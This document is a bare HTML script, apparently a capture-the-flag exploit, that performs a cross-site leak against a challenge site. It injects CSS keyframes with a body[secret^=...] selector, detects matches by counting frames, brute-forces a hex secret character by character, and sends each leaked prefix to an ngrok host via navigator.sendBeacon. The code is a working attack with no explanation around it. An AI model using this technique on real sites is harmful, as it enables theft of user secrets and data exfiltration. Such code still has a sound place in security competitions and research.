<script>
  const TARGET = "https://09e79ecfa54a-thoughts.challs.m0lecon.it?customize=";
  const CHARSET = "abcdef0123456789";
  let leaked = "";
  
  const sleep = ms => new Promise(r => setTimeout(r, ms));


  async function main(){
    wg.close();

    await sleep(100);

        while(1){
            console.log("loop 1");

        for(let i = 0; i < CHARSET.length; i++){
            let toguess = CHARSET[i];
            const payload = `<p><style>@keyframes a{0%{position:fixed;content-visibility:hidden}}body[secret^="${leaked + toguess}"]{animation:a 0s 1ms both;position-try:normal flip-inline}</style><iframe src=about:blank></iframe>`;
            // const w = window.open(`${TARGET}${encodeURIComponent(payload)}`, toguess, "width=500,height=500");
            w = window.open("https://bw15zh2p.requestrepo.com/a.html?payload=" + encodeURIComponent(payload));
            await sleep(250);
            let found = w.frames.length == 0;
            await sleep(10);
            w.location = "about:blank";

            console.log(leaked + toguess, found);
            w.close();
            if(found){
                if(CHARSET[i - 1] === undefined) continue;
                leaked += CHARSET[i - 1] || 'a';
                console.log(leaked);
                break;
            }
        

        };


        navigator.sendBeacon(`https://3f2087493125.ngrok-free.app/sbrugo?data=${leaked}`);
        
    }


}

wg = window.open("https://bw15zh2p.requestrepo.com/", "", "width=1000,height=1000");

setTimeout(() => {
main();
},1000)

</script>